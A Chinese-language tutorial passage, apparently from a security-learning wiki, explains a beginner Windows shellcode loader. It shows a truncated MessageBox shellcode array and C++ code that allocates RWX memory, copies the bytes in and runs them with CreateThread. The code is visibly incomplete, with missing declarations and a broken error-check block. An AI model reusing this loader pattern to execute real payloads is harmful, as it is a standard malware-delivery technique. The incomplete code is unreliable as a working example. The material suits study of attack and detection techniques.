llcode-starter.md"><template slot="contents"><div><h2 id="我们的目标让-shellcode-跑起来" class="toc-header"><a class="toc-anchor" href="#我们的目标让-shellcode-跑起来">¶</a> 🎯 我们的目标：让 Shellcode 跑起来！</h2>
<p>在上一章中，我们知道 Shellcode 是一段纯粹的机器指令（我们的“子弹”），而 <strong>Loader</strong>（我们的“枪”）就是负责将它送入内存并执行的程序。</p>
<p>对于入门级实验，我们将使用攻防领域的“Hello World”——一段能够弹出 Windows 提示框 (MessageBox) 的 Shellcode，来验证我们的 Loader 是否有效。</p>
<hr>
<h3 id="h-1-️-准备你的子弹shellcode" class="toc-header"><a class="toc-anchor" href="#h-1-️-准备你的子弹shellcode">¶</a> 1. 🛠️ 准备你的“子弹”（Shellcode）</h3>
<p>Shellcode 的格式与你的程序架构（32位/x86或64位/x64）必须严格匹配！</p>
<p>我们使用一段常见的 <strong>32位 (x86)</strong> 弹窗 Shellcode 作为例子，这段代码的功能是调用 Windows API <code>MessageBoxA</code>：</p>

// 长度：199 字节 (bytes)

    0x33, 0xc9, 0x64, 0x8b, 0x49, 0x30, 0x8b, 0x49, 0x0c, 0x8b,
    0x49, 0x1c, 0x8b, 0x59, 0x08, 0x8b, 0x41, 0x20, 0x8b, 0x09, 
    0x80, 0x78, 0x0c, 0x33, 0x75, 0xf2, 0x8b, 0xeb, 0x03, 0x6d,

<h3 id="h-2-加载器的标准三步走核心原理" class="toc-header"><a class="toc-anchor" href="#h-2-加载器的标准三步走核心原理">¶</a> 2. 🧩 加载器的“标准三步走”（核心原理）</h3>
<p>我们的 Loader 只需要调用三个关键的 Windows API 函数：</p>
<ol>
<li>
<p><strong>找地皮（申请内存）：<code>VirtualAlloc</code></strong></p>
<ul>
<li><strong>目标：</strong> 向操作系统申请一块**可读、可写、可执行（RWX）**的内存区域。</li>
<li><strong>原因：</strong> Windows 的安全机制（DEP）通常阻止在非执行内存上运行代码。我们必须明确告诉系统：“我这块内存是用来运行代码的！”</li>
</ul>
</li>
<li>
<p><strong>搬家具（写入数据）：<code>RtlMoveMemory</code></strong></p>
<ul>
<li><strong>目标：</strong> 将上面定义的 <code>shellcode[]</code> 数组，复制到 <code>VirtualAlloc</code> 申请的那块内存地址中。</li>
</ul>
</li>
<li>
<p><strong>剪彩（执行代码）：<code>CreateThread</code></strong></p>
<ul>
<li><strong>目标：</strong> 创建一个新的线程，并把它的起始执行点 (<code>LPTHREAD_START_ROUTINE</code>) 指向我们刚刚写入 Shellcode 的内存地址。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="h-3-完整代码实现-c" class="toc-header"><a class="toc-anchor" href="#h-3-完整代码实现-c">¶</a> 3. 💻 完整代码实现 (C++)</h3>

    printf("[*] 正在申请 RWX 内存...\n");

    // 1. 申请内存
    LPVOID exec_mem = VirtualAlloc(
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE  // &lt;-- 这是主要的特征点！
    );
    
    if (exec_mem == NULL) {
        printf("[-] 内存分配失败！\n");
        return -1;
    }
    printf("[+] 内存分配成功，地址: 0x%p\n", exec_mem);

    // 2. 复制 Shellcode
    RtlMoveMemory(exec_mem, shellcode, sizeof(shellcode));
    printf("[+] Shellcode 已写入内存\n");

    // 3. 执行代码
    HANDLE hThread = CreateThread(
        NULL, 
        0, 
        (LPTHREAD_START_ROUTINE)exec_mem, 
        NULL, 
        0, 
        NULL
    );

        return -1;
    }
    printf("[+] 线程已创建，等待弹窗...\n");

    // 等待子线程执行完毕，防止主程序提前退出
    WaitForSingleObject(hThread, INFINITE);

    return 0;
